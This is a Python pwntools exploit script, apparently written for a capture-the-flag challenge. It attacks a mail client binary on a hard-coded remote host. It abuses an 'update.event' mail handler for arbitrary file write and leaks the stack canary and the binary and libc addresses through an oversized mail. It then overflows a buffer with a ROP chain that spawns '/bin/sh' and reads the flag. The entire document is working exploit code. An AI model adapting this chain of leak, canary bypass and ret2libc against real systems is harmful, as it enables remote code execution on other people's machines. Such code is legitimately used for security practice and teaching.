from pwn import *
e = ELF("./mailclient")
libc = ELF("./lib/libc.so.6")

context.binary = e

def login(email, password):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", email)
    p.sendlineafter(": ", password)

def send(username, subject, content, content_size=None):
    if content_size is None:
        content_size = len(content)
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", f"{username}@hackemall.live")
    p.sendlineafter(": ", subject)
    p.sendlineafter(": ", str(content_size))
    p.sendafter(": ", content)

def read():
    p.sendlineafter("> ", "4")
    p.recvuntil(": ")
    subject = p.recvline()[:-1]
    data = p.recvuntil("*")[:-1]
    return subject, data

def build_packet(cmd, data,length=None):
    if length is None:
        length = len(data)
    # Builds an update.event packet(for ones that aren't UPD)
    return cmd + str(length).zfill(3).encode() + data

def send_event(data, content=None):
    if content is None:
        content = "I swear on my life, I always try, but in my eye, I can fly. Better luck next time.\n"
    send("update.event", data, content)

def custom_mail(username, data, size=None):
    if size is None:
        size = len(data)
    if type(data) == str:
        data = data.encode()
    # Build a custom email
    send_event(build_packet(b"SET", b"/tmp/evil"))
    send_event(build_packet(b"NEW", str(size).zfill(4).encode() + data))
    send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
    send_event(build_packet(b"NEW", b"pwned",len("pwned") + 1)) # smuggle the pipe in since it will be after the subject and we cant put it in the subject manually
    send_event(build_packet(b"ATE", b"/tmp/evil"))

def mail_file(username, filname):
    # Send myself a mail with subject "pwned" and content in the givne file
    send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
    send_event(build_packet(b"NEW", b"pwned",len("pwned") + 1)) # smuggle the pipe in since it will be after the subject and we cant put it in the subject manually
    send_event(build_packet(b"ATE", filname))


p = remote("139.162.36.205" if args.REMOTE else "localhost", 1337)

# We just need to interact with the mailclient's update.event file and that gives us arbitrary file write.
# From there, we can forge custom emails and achieve buffer overflows.

# Sending an email to update.event@hackemall.live will do it.

email = "day@hackemall.live"
password = "t"

username = email.split("@")[0]

login(email, password)
custom_mail(username, b"", size=0x10000) # Very high size despite not putting much in the file. This makes it over print, so we can get leaks before exploiting the bOF.

_, leaks = read()
if leaks == b'':
    log.failure("Leaks failed.")
    quit()
log.success("Leaks suceeded")

old_buf = leaks
leaks = leaks[0x808:]

canary = u64(leaks[:8])
log.info(f"Canary: {hex(canary)}")
"""
for i in range(8, len(leaks), 8):
    num = u64(leaks[i:i+8].ljust(8, b"\x00"))
    if num == 0:
        continue
    print(hex(num), i)
"""

e.address = u64(leaks[16:16+8]) - 0x2335
libc.address = u64(leaks[64:64+8]) - 0x29d90
log.info(f"Binary base: {hex(e.address)}")
log.info(f"Libc base: {hex(libc.address)}")

rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

payload = flat(canary, e.address + 0x4000, rop.chain())

# Ok, now we need to construct the payload in a file. Not easy.
# We set the update file to /home/mailserver/data/day and then use NEW and some tomfoolery to dump the file path of some content file that contains the main par tof the payload into my mail
# Then, we can cleanly leak the file path(we dump it as the subject) and use existing primitives to build up the file until its suitable
# And use our regular old primitives to get it to read in the payload

send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
send_event(b"NEW" + b"34", payload) # Basically the data written will be NEW34|/tmp/mail/content/FILENAME . 34| will be sscanf'd to get the length as 34 and then the data will be read in as the rest
send_event(b"ATE" + b"001")

filname, _ = read()
log.success(f"Leaked filename: {filname.decode()}")

# Now ATF is actually useful. We have 4 bytes + payload. We want evil size + 0x804 filler bytes + 4 bytes + payload
# Unfortunately we cannot write that many bytes in the subject at a time. No worry, it's only a few iterations.

send_event(build_packet(b"SET", filname))
to_add = str(0x808 + len(payload)).zfill(4).encode() + b"A"*0x804

chunks = []
for i in range(0, len(to_add), 200):
    chunks.append(to_add[i:i+200])

for chunk in chunks[::-1]:
    send_event(build_packet(b"ATF", chunk))

mail_file(username, filname)
p.sendlineafter("> ", "4")
p.clean(0.2)
p.sendline("cd /home/mailclient")
p.sendline("cat flag*")
p.interactive()
